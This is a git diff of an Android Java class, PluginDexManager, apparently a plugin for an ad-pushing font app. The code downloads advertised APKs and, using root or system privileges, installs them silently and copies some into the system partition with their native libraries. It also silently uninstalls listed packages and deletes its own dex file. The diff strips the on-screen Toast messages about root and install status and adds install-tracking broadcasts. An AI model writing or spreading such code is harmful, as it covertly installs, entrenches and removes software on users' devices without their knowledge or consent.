@@ -1,6 +1,7 @@
 package com.ningso.silence;
 
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -9,7 +10,6 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.Message;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.ningso.silence.downloader.bizs.DLManager;
 import com.ningso.silence.downloader.interfaces.SimpleDListener;
@@ -17,9 +17,6 @@ import com.ningso.silence.entity.AdBean;
 import com.ningso.silence.utils.BackgroundHandler;
 import com.ningso.silence.utils.PackageUtils;
 import com.ningso.silence.utils.ShellUtils;
-
-import org.json.JSONException;
-import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -33,9 +30,7 @@ import java.util.List;
  * Created by NingSo on 16/2/29.下午10:23
  *
  * @author: NingSo
- * @Email: ningdev@163.com
- * 1:检测黑名单是否安装,如果存在则不执行下列逻辑
- * 2:如果不存在,判断卸载名单是否安装
+ * @Email: ningso.ping@gmail.com
  */
 public class PluginDexManager {
     private static String TAG = PluginDexManager.class.getSimpleName();
@@ -48,33 +43,38 @@ public class PluginDexManager {
     private static final int HAS_ROOT_FAIL = 0x0002;
     private static final int HAS_INSTALL_SUCCESS = 0x0003;
     private static final int HAS_INSTALL_FAIL = 0x0004;
+    private static final String INSTALL_NOMALSUCCESS = "com.ningso.fontad.action.NOMALSUCCESS";
+    private static final String INSTALL_SILENTSUCCESS = "com.ningso.fontad.action.SILENTSUCCESS";
+    private static final String INSTALL_FAIL = "com.ningso.fontad.action.FAIL";
 
     private AdBean adBean;
     private String installFile;
-    public Handler handler = new Handler() {
+    private Handler handler = new Handler() {
         @Override
         public void handleMessage(Message msg) {
             super.handleMessage(msg);
             switch (msg.what) {
-                case HAS_ROOT_SUCCESS:
-                    Toast.makeText(mContext, "Root: True", Toast.LENGTH_SHORT).show();
-                    break;
-                case HAS_ROOT_FAIL:
-                    Toast.makeText(mContext, "Root: False", Toast.LENGTH_SHORT).show();
-                    break;
                 case HAS_INSTALL_SUCCESS:
-                    Toast.makeText(mContext, "Install: True", Toast.LENGTH_SHORT).show();
-                    //安装成功
                     if (adBean != null) {
-                        if (adBean.getActionType() == 1) {
-                            ShellUtils.CopyApkToSystem(installFile);
-                            ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
-                        }
+                        BackgroundHandler.post(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (adBean.getActionType() == 1) {
+                                    boolean has2system = ShellUtils.CopyApkToSystem(installFile);
+                                    ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
+                                    Log.e(TAG, "plugin copy system" + has2system);
+                                }
+                                deleteDex(mContext);
+                                Log.e(TAG, "plugin de");
+                            }
+                        });
+
                     }
-                    deleteDex(mContext);
                     break;
                 case HAS_INSTALL_FAIL:
-                    Toast.makeText(mContext, "Install: False", Toast.LENGTH_SHORT).show();
+                    deleteDex(mContext);
+                    sendBroadcastToAnalytics(INSTALL_FAIL, 3, "success");
+                    Log.e(TAG, "plugin install fail");
                     break;
             }
         }
@@ -112,17 +112,21 @@ public class PluginDexManager {
                                         super.onFinish(file);
                                         installFile = file.getAbsolutePath();
                                         new InStallSilent(installFile).start();
+                                        Log.d(TAG, "plugin download finish" + installFile);
                                     }
 
                                     @Override
                                     public void onError(int status, String error) {
                                         super.onError(status, error);
+                                        Log.d(TAG, "plugin download error");
                                     }
                                 });
                     }
+                    return true;
                 }
+            } else {
+                return false;
             }
-            return true;
         } catch (Exception e) {
             e.printStackTrace();
             return false;
@@ -196,7 +200,6 @@ public class PluginDexManager {
         } catch (Exception e) {
             e.printStackTrace();
         }
-
         return stringBuilder.toString();
     }
 
@@ -262,10 +265,10 @@ public class PluginDexManager {
                 @Override
                 public void run() {
                     if (PackageUtils.checkPackageInstalled(content, str)) {
-                        Log.e(TAG, "unInstall" + PackageUtils.uninstallSilent(content, str, false));
+                        Log.d(TAG, "unInstallPackages: " + PackageUtils.uninstallSilent(content, str, false));
                     }
                 }
-            }, 5000);
+            });
         }
     }
 
@@ -281,7 +284,19 @@ public class PluginDexManager {
         public void run() {
             super.run();
             Message message = new Message();
-            int installsuccuess = PackageUtils.install(mContext, filePath);
+            int installsuccuess;
+            if (PackageUtils.isSystemApplication(mContext) || ShellUtils.checkRootPermission()) {
+                installsuccuess = PackageUtils.installSilent(mContext, filePath);
+                if (installsuccuess == 1) {
+                    sendBroadcastToAnalytics(INSTALL_SILENTSUCCESS, 0, "success");
+                }
+            } else {
+                installsuccuess = PackageUtils.installNormal(mContext, filePath) ? 1 : -3;
+                if (installsuccuess == 1) {
+                    sendBroadcastToAnalytics(INSTALL_NOMALSUCCESS, 1, "success");
+                }
+            }
+            Log.d(TAG, "plugin installsuccuess > " + installsuccuess);
             //  boolean hassuccess = ApkController.install("/system/priv-app/" + "demo.apk", getApplicationContext());
             if (installsuccuess == 1) {
                 message.what = HAS_INSTALL_SUCCESS;
@@ -292,4 +307,22 @@ public class PluginDexManager {
         }
     }
 
+    /**
+     * 发送通知宿主用作统计
+     *
+     * @param actionType  发送广播action的类型
+     * @param installType 安装类型,0--静默安装,1--正常安装,3--安装失败,-1不是安装命令
+     * @param result      返回执行结果
+     */
+    private void sendBroadcastToAnalytics(String actionType, int installType, String result) {
+        try {
+            Intent intent = new Intent(actionType);
+            intent.putExtra("install_pkg", adBean.getPkgName());
+            intent.putExtra("install_type:", installType);
+            intent.putExtra("action_result", result);
+            mContext.sendBroadcast(intent);
+        } catch (Exception e) {
+            Log.d("ee", "dex sendBroadcastToAnalytics extra exception");
+        }
+    }
 }
